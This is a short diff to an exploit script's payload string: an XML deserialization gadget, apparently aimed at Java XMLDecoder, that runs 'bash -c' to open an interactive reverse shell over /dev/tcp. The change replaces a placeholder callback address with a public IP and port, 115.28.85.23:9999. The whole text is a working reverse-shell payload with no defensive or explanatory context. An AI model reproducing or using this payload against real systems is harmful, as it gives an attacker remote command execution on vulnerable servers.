@@ -26,7 +26,7 @@ payload = '''
 <string>-c</string>
 </void>
 <void index="2">
-<string>bash -i &gt;&amp; /dev/tcp/10.10.10.10/8080 0&gt;&amp;1</string>
+<string>bash -i &gt;&amp; /dev/tcp/115.28.85.23/9999 0&gt;&amp;1</string>
 </void>
 </array>
 <void method="start"/></void>
